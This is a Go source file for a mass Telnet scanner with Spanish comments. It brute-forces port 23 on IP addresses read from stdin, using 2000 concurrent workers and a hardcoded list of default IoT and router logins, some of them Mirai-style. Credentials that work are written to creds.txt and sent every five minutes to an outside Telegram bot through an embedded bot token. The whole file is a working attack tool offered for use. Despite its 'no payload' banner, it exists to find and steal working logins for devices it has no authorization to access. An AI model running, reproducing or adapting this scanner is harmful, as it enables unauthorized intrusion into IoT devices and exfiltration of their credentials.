package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// TOKEN DE TELEGRAM
const TELEGRAM_TOKEN = "8386275852:AAEv_-0nxiXN1wtFXoSv91Ec6iYVsnUHT4o"
const TELEGRAM_CHAT_ID = "8386275852" // Puede ser tu chat ID

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
	{"root", "12345678"},
	{"root", "12345"},
	{"root", "123456789"},
	{"root", "qwerty"},
	{"root", "passw0rd"},
	{"root", "letmein"},
	{"root", "changeme"},
	{"root", "Zte521"},
	{"root", "hikvision"},
	{"admin", "hikvision"},
	{"root", "dahua"},
	{"admin", "dahua"},
	{"root", "Admin123"},
	{"root", "password123"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2026"},
}

const (
	TELNET_TIMEOUT  = 8 * time.Second
	MAX_WORKERS     = 2000
	STATS_INTERVAL  = 1 * time.Second
	MAX_QUEUE_SIZE  = 100000
	CONNECT_TIMEOUT = 3 * time.Second
)

// NO HAY PAYLOAD - solo verificamos login
const FAKE_PAYLOAD = "echo LOGIN_SUCCESS"

type CredentialResult struct {
	Host     string
	Username string
	Password string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	newCredentials   []CredentialResult // Para envío por lotes
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
	outputFile       *os.File
	lastTelegramSend time.Time
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	// Abrir archivo para guardar credenciales
	f, err := os.OpenFile("creds.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error abriendo creds.txt: %v\n", err)
		return nil
	}
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
		newCredentials:   make([]CredentialResult, 0),
		outputFile:       f,
		lastTelegramSend: time.Now(),
	}
}

func (s *TelnetScanner) sendTelegram() {
	s.lock.Lock()
	defer s.lock.Unlock()
	
	if len(s.newCredentials) == 0 {
		return
	}
	
	// Crear mensaje
	var msg strings.Builder
	msg.WriteString("🔐 *NUEVAS CREDENCIALES TELNET*\n")
	msg.WriteString(fmt.Sprintf("⏱️ %s\n", time.Now().Format("2006-01-02 15:04:05")))
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━\n")
	
	for i, cred := range s.newCredentials {
		msg.WriteString(fmt.Sprintf("%d. `%s` | %s:%s\n", 
			i+1, cred.Host, cred.Username, cred.Password))
	}
	
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━\n")
	msg.WriteString(fmt.Sprintf("📊 Total: %d nuevas\n", len(s.newCredentials)))
	
	// Enviar a Telegram
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", TELEGRAM_TOKEN)
	
	data := url.Values{}
	data.Set("chat_id", TELEGRAM_CHAT_ID)
	data.Set("text", msg.String())
	data.Set("parse_mode", "Markdown")
	
	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		fmt.Printf("\n[!] Error enviando a Telegram: %v\n", err)
		return
	}
	defer resp.Body.Close()
	
	fmt.Printf("\n📤 Enviadas %d credenciales a Telegram\n", len(s.newCredentials))
	
	// Limpiar nuevas credenciales
	s.newCredentials = []CredentialResult{}
}

func (s *TelnetScanner) telegramWorker() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-s.done:
			// Enviar lo que quede antes de salir
			s.sendTelegram()
			return
		case <-ticker.C:
			s.sendTelegram()
		}
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, *CredentialResult) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, nil
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, nil
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	conn.Write([]byte(username + "\n"))

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, nil
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	conn.Write([]byte(password + "\n"))

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	shellFound := false
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			shellFound = true
			break
		}
	}

	if shellFound {
		// Solo enviamos un comando falso para confirmar, sin payload real
		conn.Write([]byte(FAKE_PAYLOAD + "\n"))
		
		return true, &CredentialResult{
			Host:     host,
			Username: username,
			Password: password,
		}
	}
	return false, nil
}

func (s *TelnetScanner) saveCredential(cred CredentialResult) {
	s.lock.Lock()
	defer s.lock.Unlock()
	
	// Guardar en archivo
	line := fmt.Sprintf("%s:%s:%s\n", cred.Host, cred.Username, cred.Password)
	s.outputFile.WriteString(line)
	s.outputFile.Sync()
	
	// Agregar a nuevas credenciales para Telegram
	s.newCredentials = append(s.newCredentials, cred)
	s.foundCredentials = append(s.foundCredentials, cred)
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		atomic.AddInt64(&s.scanned, 1)
		
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				s.saveCredential(*result)
				fmt.Printf("\n✅ %s | %s:%s\n", 
					result.Host, result.Username, result.Password)
				
				break
			}
		}
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 Escaneados: %d | ✅ Encontrados: %d | ❌ Fallos: %d | Cola: %d", 
				scanned, valid, invalid, queueSize)
		}
	}
}

func (s *TelnetScanner) Run() {
	defer s.outputFile.Close()
	
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     TELNET SCANNER - TELEGRAM BOT     ║")
	fmt.Println("║     (SOLO CREDENCIALES - SIN PAYLOAD) ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("Workers: %d\n", MAX_WORKERS)
	fmt.Printf("Telegram: ✅ Activado (cada 5 minutos)\n")
	fmt.Printf("Output: creds.txt\n\n")
	
	// Iniciar worker de Telegram
	go s.telegramWorker()
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" && net.ParseIP(host) != nil {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				s.hostQueue <- host
			}
		}
		
		fmt.Printf("\n📥 Hosts cargados: %d\n", hostCount)
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	// Esperar último envío de Telegram
	time.Sleep(2 * time.Second)
	s.sendTelegram()

	valid := atomic.LoadInt64(&s.valid)
	
	fmt.Printf("\n\n✅ SCAN COMPLETADO\n")
	fmt.Printf("✅ Credenciales encontradas: %d\n", valid)
	fmt.Printf("📁 Guardadas en creds.txt\n")
}

func main() {
	scanner := NewTelnetScanner()
	if scanner != nil {
		scanner.Run()
	}
}
